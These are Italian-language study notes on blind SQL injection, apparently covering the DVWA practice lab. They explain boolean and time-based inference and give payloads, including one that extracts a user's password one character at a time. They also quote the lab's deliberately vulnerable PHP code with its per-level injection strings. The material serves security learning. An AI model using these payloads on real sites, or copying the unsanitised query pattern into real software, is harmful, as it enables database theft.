## SQL injection (Blind)

- http://www.securiteam.com/securityreviews/5DP0N1P76E.html
- https://en.wikipedia.org/wiki/SQL_injection
- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- https://owasp.org/www-community/attacks/Blind_SQL_Injection
- http://bobby-tables.com/

TODO prova sqlmap

L'applicazione è vulnerabile all'injection ma l'attaccante non vede l'output, può solo dedurre informazioni dal risultato vero/falso della query.
Considerando che la richiesta `http://example.example.com/show.php?id=5` fa eseguire la query `select * from tablename where id = 'id'`, l'attaccante può eseguire le seguenti richieste: `http://example.example.com/show.php?id=5 or 1=1`, `http://example.example.com/show.php?id=5 and 1=2`.
Se la prima carica il contenuto (vera secondo `or 1=1`) mentre la seconda produce un errore (falsa secondo `and 1=2`), l'applicazione è probabilmente vulnerabile.
L'attaccante può sfruttare questa vulnerabilità per estrarre informazioni puntuali (es. versione di MySQL).
L'attaccante esegue `http://example.example.com/show.php?id=5 and substring(@@version, 1, instr(@@version, '.') - 1)=4`.
Se il contenuto (`id=5`) viene mostrato allora la versione è 4, diversamente ottiene un errore.

Nei casi in cui l'output dell'applicazione in seguito alle injection non produca nessuna differenza, posso usare `waitfor delay '0:00:10'`, `sleep(10)` o `pg_sleep(10)`.
Oppure `benchmark(1000000000, md5(1))` (esegue 1000000000 di volte md5(1)).

Posso sfruttare anche le condizioni `if`.
Injection: `1 union select if(substring(user_password, 1, 1) = char(50), benchmark(5000000, encode('msg', 'by 5 seconds')), null) from users where id = 1;`.
Se la risposta è ritardata, posso supporre che il primo carattere della password dell'utente con `id = 1` sia `2` (`char(50)`).
Preparando injection diverse posso enumerare il contenuto del database.

### SQL injection (Blind) - Low

```
// Get input
$id = $_GET[ 'id' ];

// Check database
$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

// Get results
$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
if( $num > 0 ) {
	// Feedback for end user
	echo '<pre>User ID exists in the database.</pre>';
}
else {
	// User wasn't found, so the page wasn't!
	header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
	// Feedback for end user
	echo '<pre>User ID is MISSING from the database.</pre>';
}
```

Exploit:

- inietta `2 and 'x'='c'`

### SQL injection (Blind) - Medium

```
// Get input
$id = $_POST[ 'id' ];
```

Exploit:

- inietta `2 and 'x'='c'`

### SQL injection (Blind) - High

```
// Get input
$id = $_COOKIE[ 'id' ];

...

// Get results
$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
if( $num > 0 ) {
	// Feedback for end user
	echo '<pre>User ID exists in the database.</pre>';
}
else {
	// Might sleep a random amount
	if( rand( 0, 5 ) == 3 ) {
		sleep( rand( 2, 4 ) );
	}
	// User wasn't found, so the page wasn't!
	header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
	// Feedback for end user
	echo '<pre>User ID is MISSING from the database.</pre>';
}
```

Exploit:

- inietta `1 union select 1,2 #`

